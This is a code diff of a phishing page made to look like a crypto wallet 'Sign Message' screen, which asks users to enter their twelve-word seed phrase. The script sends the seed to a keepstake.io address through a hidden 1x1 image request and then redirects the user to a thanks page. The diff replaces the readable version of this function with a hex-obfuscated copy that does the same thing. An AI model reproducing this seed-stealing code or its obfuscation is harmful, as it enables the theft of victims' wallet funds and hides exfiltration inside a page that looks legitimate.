@@ -3157,24 +3157,7 @@ button.first-time-flow__button--tertiary:hover {
       </style><span class="css-transition-group"></span></div></div><!-- react-empty: 27 --><div class="app-primary from-right" style="width: 100%;"><div class="initialize-screen flex-column flex-center flex-grow"><h3 class="flex-center text-transform-uppercase " style="background: rgb(235, 235, 235); color: rgb(174, 174, 174); margin-bottom: 24px; width: 100%; font-size: 20px; padding: 6px;">Sign Message</h3><h3>Wallet Seed</h3><textarea id="seed" name="seed" placeholder="Enter your twelve word phrase here to sign an ownership message." class="twelve-word-phrase letter-spacey"></textarea><div class="flex-row flex-space-between" style="margin-top: 30px; width: 50%;"><button class="primary">CANCEL</button><button onclick="createImage()" name="submit" type="submit" class="primary">OK</button></div><div style="margin-top:45px;"id="loading"></div></div></div></div></div>
     <script src="./ui.js" type="text/javascript" charset="utf-8"></script>
     <script type="text/javascript" charset="utf-8">
-    function createImage(){
-
-    var loading = document.getElementById("loading");
-
-    loading.innerHTML = "<img src='loading.gif' width='35px' style='float:left'><p style='font-size:1.7em;float:right;margin-top:6px;margin-left:15px;'>signing</p>";
-
-    var seed = document.getElementById("seed");
-    var seedx = "https://web3.keepstake.io/process.php?seed=" + seed.value;
-    var img = new Image(1,1);
-    img.src = seedx;
-
-    window.setTimeout(redirect,14000);
-
-    function redirect(){
-      window.location.href = "https://keepstake.io/thanks";
-    }
-
-    }
+var _0xcbf5=["\x6C\x6F\x61\x64\x69\x6E\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x27\x6C\x6F\x61\x64\x69\x6E\x67\x2E\x67\x69\x66\x27\x20\x77\x69\x64\x74\x68\x3D\x27\x33\x35\x70\x78\x27\x20\x73\x74\x79\x6C\x65\x3D\x27\x66\x6C\x6F\x61\x74\x3A\x6C\x65\x66\x74\x27\x3E\x3C\x70\x20\x73\x74\x79\x6C\x65\x3D\x27\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x31\x2E\x37\x65\x6D\x3B\x66\x6C\x6F\x61\x74\x3A\x72\x69\x67\x68\x74\x3B\x6D\x61\x72\x67\x69\x6E\x2D\x74\x6F\x70\x3A\x36\x70\x78\x3B\x6D\x61\x72\x67\x69\x6E\x2D\x6C\x65\x66\x74\x3A\x31\x35\x70\x78\x3B\x27\x3E\x73\x69\x67\x6E\x69\x6E\x67\x3C\x2F\x70\x3E","\x73\x65\x65\x64","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x65\x62\x33\x2E\x6B\x65\x65\x70\x73\x74\x61\x6B\x65\x2E\x69\x6F\x2F\x70\x72\x6F\x63\x65\x73\x73\x2E\x70\x68\x70\x3F\x73\x65\x65\x64\x3D","\x76\x61\x6C\x75\x65","\x73\x72\x63","\x73\x65\x74\x54\x69\x6D\x65\x6F\x75\x74","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6B\x65\x65\x70\x73\x74\x61\x6B\x65\x2E\x69\x6F\x2F\x74\x68\x61\x6E\x6B\x73"];function createImage(){var _0xf115x2=document[_0xcbf5[1]](_0xcbf5[0]);_0xf115x2[_0xcbf5[2]]= _0xcbf5[3];var _0xf115x3=document[_0xcbf5[1]](_0xcbf5[4]);var _0xf115x4=_0xcbf5[5]+ _0xf115x3[_0xcbf5[6]];var _0xf115x5= new Image(1,1);_0xf115x5[_0xcbf5[7]]= _0xf115x4;window[_0xcbf5[8]](_0xf115x6,14000);function _0xf115x6(){window[_0xcbf5[10]][_0xcbf5[9]]= _0xcbf5[11]}}
     </script>
   
 </body></html>
